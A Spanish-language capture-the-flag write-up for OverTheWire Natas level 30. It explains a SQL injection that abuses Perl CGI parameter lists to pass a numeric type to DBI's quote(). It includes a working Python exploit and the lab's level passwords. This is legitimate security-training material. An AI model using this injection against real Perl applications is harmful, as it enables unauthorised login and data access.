# Natas Level30

## Descripción
> **Level Goal (natas30.natas.labs.overthewire.org):** Un login en Perl que, a diferencia de niveles anteriores, sí usa el método "seguro" de la librería `DBI` para escapar valores: `$dbh->quote(param('username'))`. La consulta se arma como `"...where username=".$dbh->quote(...)." and password=".$dbh->quote(...)`.

## Solución
`DBI->quote()` acepta en realidad **dos** argumentos: `quote($value, $type)`. Si se le indica un `$type` que corresponde a un tipo de dato **numérico** (por ejemplo `SQL_INTEGER`), `quote()` asume que el valor ya es seguro tal cual (un número no necesita comillas ni escapado) y **devuelve el valor sin comillas y sin ningún escapado**, confiando ciegamente en que el llamador tiene razón sobre el tipo.

El código de la aplicación llama a `$dbh->quote(param('password'))` con un solo argumento aparente, pero `param()` de `CGI.pm`, cuando el parámetro se envía **más de una vez** en la petición, devuelve una **lista** de valores en contexto de lista — y esa lista se "aplana" automáticamente como argumentos posicionales de `quote()`. Enviando el campo `password` **dos veces** en el POST, el primer valor se convierte en `$value` y el segundo en `$type`: si ese segundo valor es un código de tipo numérico, logramos que nuestro primer valor se inserte en la consulta **totalmente sin escapar ni entrecomillar**.

```python
import requests

auth = ("natas30", "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF")
url = "http://natas30.natas.labs.overthewire.org/index.pl"

data = [
    ("username", "natas31"),
    ("password", "1 OR username='natas31'"),  # $value: SQL crudo, sin comillas
    ("password", "2"),                         # $type: código de tipo numérico -> sin escapar
]
r = requests.post(url, auth=auth, data=data)
print(r.text)
# win! here is your result:
# natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
```

La consulta final ejecutada equivale a:
```sql
SELECT * FROM users WHERE username='natas31' AND password=1 OR username='natas31'
```
Por precedencia de operadores (`AND` liga más fuerte que `OR`), esto se simplifica a `username='natas31'` — coincide con la fila de `natas31` sin importar la contraseña real.

## Notas adicionales
- La API de `DBI->quote($value, $type)` está documentada, pero es fácil pasar por alto que aceptar **listas** provenientes de entrada de usuario (como el resultado de `CGI::param()` con parámetros duplicados) y pasarlas directamente a una función con más de un parámetro posicional puede convertir un dato controlado por el atacante en un **argumento de control** (aquí, el tipo SQL), no solo en un valor.
- Aunque `quote()` bien usado es una defensa válida contra inyección SQL, esta vulnerabilidad es un buen ejemplo de por qué **los prepared statements con parámetros ligados** (`$sth->bind_param`) son preferibles: no dejan ningún resquicio para que el "tipo" de un valor se confunda con su contenido, porque el driver nunca interpola texto SQL directamente.

## Referencias
- Reto original: http://natas30.natas.labs.overthewire.org/
- Apoyo: https://metacpan.org/pod/DBI#quote (documentación de `DBI->quote`, incluido el parámetro opcional de tipo)
- Apoyo: https://anyafachri.medium.com/perl-dbi-unsafe-escaping-natas30-overthewire-write-up-2e21a6f07321 (walkthrough con el mismo enfoque de tipo numérico + parámetro duplicado)
